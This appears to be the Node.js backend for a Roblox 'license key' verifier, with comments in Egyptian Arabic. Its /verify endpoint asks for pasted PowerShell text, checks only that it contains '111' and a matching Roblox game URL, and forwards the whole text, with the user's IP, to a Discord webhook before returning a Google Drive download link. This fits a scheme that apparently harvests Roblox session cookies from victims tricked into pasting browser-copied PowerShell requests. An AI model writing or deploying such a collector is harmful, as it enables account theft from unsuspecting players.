const express = require("express");
const cors = require("cors"); // رجعنا مكتبة cors
const fetch = require("node-fetch"); 
const FormData = require("form-data");

const app = express();

// استخدام مكتبة cors ببساطة شديدة (دي بتسمح بكل حاجة أوتوماتيك)
app.use(cors()); 

// عشان يقرأ البيانات اللي جاية
app.use(express.json());

const WEBHOOK_URL = process.env.WEBHOOK_URL; 

// ... وتكمل باقي كودك (fileMap و app.post) عادي جداً

/* =========================
   🔥 ربط Game IDs بالملفات
========================= */

const fileMap = {
    "109983668079237": "1b1GnSdi7l7Mv53UEKtjNKdlC9IG2fFIq",
    "131623223084840": "1D4KEFjunZZfh_ZAwxZwSFuG8LRFytlpa",
    "119987266683883": "1WM9DzJRZsfVmb_MKP-EWrukLAKraJRUY",
    "72845937010155": "1cBQbIRkIsSuRDqvnt1IkHB26cp40P-Gv",
    "119865329453489": "1wQrQR7Svd3-ps7HWpoHAktxWzmFESZaI",
    "16518256559": "1eX-5pbCmfccZHPtEAcsxXmqJAASzwmDm",
    "139766023909499": "1xjV7kfAKCszuzEasOezWocmxtklly5B-",
    "000": "1A1UHkQct18ZeK9qXWm7uynNIPPP5xUzM"
};

function getRobloxGameIdFromUrl(value) {
    if (!value || typeof value !== "string") return null;

    const input = value.trim();
    if (!input || /\s/.test(input)) return null;

    const candidate = /^https?:\/\//i.test(input) ? input : `https://${input}`;

    try {
        const parsed = new URL(candidate);
        const host = parsed.hostname.toLowerCase();

        if (host !== "roblox.com" && !host.endsWith(".roblox.com")) {
            return null;
        }

        const parts = parsed.pathname.split("/").filter(Boolean);
        const gamesIndex = parts.findIndex((part) => part.toLowerCase() === "games");

        if (gamesIndex === -1 || !parts[gamesIndex + 1]) {
            return null;
        }

        const gameId = parts[gamesIndex + 1].match(/^\d+$/);
        return gameId ? gameId[0] : null;
    } catch (err) {
        return null;
    }
}

function getRobloxGameIdsFromText(value) {
    if (!value || typeof value !== "string") return [];

    const ids = new Set();
    const urlPattern = /(?:https?:\/\/)?(?:[\w-]+\.)*roblox\.com\/[^\s"'<>]+/gi;
    const matches = value.match(urlPattern) || [];

    matches.forEach((match) => {
        const gameId = getRobloxGameIdFromUrl(match);
        if (gameId) ids.add(gameId);
    });

    return Array.from(ids);
}

/* =========================
   🔐 /verify
========================= */

app.post(["/", "/verify"], async (req, res) => {

    console.log("Incoming body:", req.body);

    const powershell = req.body.licenseKey;

    // حماية إضافية: لو مفيش بيانات أو البيانات مش نص (عشان السيرفر ميقعش)
    if (!powershell || typeof powershell !== "string") {
        return res.json({ success: false });
    }

    const warning = "111";

    if (!powershell.includes(warning)) {
        return res.json({ success: false });
    }

    const cleanedInput = powershell.replace(/\s+/g, " ").trim();
    const gameUrl = typeof req.body.gameUrl === "string" ? req.body.gameUrl.trim() : "";
    const gameId = getRobloxGameIdFromUrl(gameUrl);

    if (!gameId) {
        console.log("Invalid Roblox game URL");
        return res.json({ success: false, error: "INVALID_GAME_URL" });
    }

    const keyGameIds = getRobloxGameIdsFromText(cleanedInput);

    if (!keyGameIds.includes(gameId)) {
        console.log("Game URL mismatch");
        return res.json({ success: false, error: "URL_MISMATCH" });
    }

    console.log("Game ID:", gameId);

    let fileId = fileMap[gameId];

    // لو الـ ID مش موجود نستخدم 000
    if (!fileId) {
        console.log("Game ID not supported — using default 000");
        fileId = fileMap["000"];
    }

    const downloadLink = "https://drive.google.com/uc?export=download&id=" + fileId;

    /* =========================
        📩 إرسال ملف TXT للديسكورد
    ========================== */

    try {
        if (WEBHOOK_URL) {
            const logMessage = `
Game ID: ${gameId}
IP: ${req.headers["x-forwarded-for"] || req.socket.remoteAddress}
Time: ${new Date().toLocaleString()}

Full PowerShell:
${powershell}
`;

            const form = new FormData();
            form.append("file", Buffer.from(logMessage), {
                filename: "log.txt",
                contentType: "text/plain"
            });

            await fetch(WEBHOOK_URL, {
                method: "POST",
                body: form
            });

            console.log("TXT file sent to Discord");
        } else {
            console.log("DISCORD_WEBHOOK not set");
        }

    } catch (err) {
        console.log("Discord error:", err.message);
    }

    return res.json({
        success: true,
        download: downloadLink
    });

}); 

/* =========================
   🚀 تشغيل السيرفر
========================= */

app.get("/health", (req, res) => {
    res.json({ ok: true });
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running...");
});
